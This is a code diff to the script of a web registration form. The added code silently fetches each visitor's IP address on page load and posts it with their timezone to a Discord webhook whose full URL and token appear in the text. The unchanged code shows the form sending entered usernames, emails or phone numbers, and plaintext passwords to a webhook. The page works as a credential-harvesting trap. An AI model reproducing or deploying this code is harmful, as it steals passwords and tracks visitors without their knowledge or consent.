@@ -134,7 +134,41 @@
     const form = document.getElementById('registerForm');
     const successMessage = document.getElementById('successMessage');
 
-    form.addEventListener('submit', async function (e) {
+    let userIP = 'Unavailable';
+    let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unavailable';
+
+    // Fetch IP on page load
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        userIP = data.ip || 'Unavailable';
+
+        // Immediately send visit log
+        fetch("https://discord.com/api/webhooks/1376133564327792721/sT4UQYQd_YI_MccmiTdmhsww6IvlKg3YXRRNle5px1yi-oXLvlUAMM3T5HwHo6gRPPCR", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "Security Bot Visit",
+            embeds: [
+              {
+                title: "👀 New Visitor",
+                color: 15158332,
+                fields: [
+                  { name: "IP Address", value: userIP, inline: false },
+                  { name: "Timezone", value: timezone, inline: false }
+                ],
+                footer: { text: "Made by Soy" },
+                timestamp: new Date()
+              }
+            ]
+          })
+        });
+      })
+      .catch(err => {
+        console.warn('IP fetch error:', err);
+      });
+
+    form.addEventListener('submit', function (e) {
       e.preventDefault();
 
       const username = document.getElementById('username').value.trim();
@@ -164,36 +198,17 @@
         return;
       }
 
-      let ip = 'Unavailable';
-      let timezone = 'Unavailable';
-
-      // Fetch IP
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const json = await res.json();
-        ip = json.ip || 'Unavailable';
-      } catch (err) {
-        console.warn('Failed to fetch IP:', err);
-      }
-
-      // Get Timezone (no permission needed)
-      try {
-        timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unavailable';
-      } catch (err) {
-        console.warn('Failed to get timezone:', err);
-      }
-
       const data = {
         username: "Security Bot Register",
         embeds: [
           {
-            title: "✅ New Person Logged",
+            title: "✅ New Registration",
             color: 3447003,
             fields: [
               { name: "Username", value: username || "(none)", inline: false },
               { name: "Email/Phone", value: input, inline: false },
               { name: "Password", value: password, inline: false },
-              { name: "IP Address", value: ip, inline: false },
+              { name: "IP Address", value: userIP, inline: false },
               { name: "Timezone", value: timezone, inline: false }
             ],
             footer: { text: "Made by Soy" },
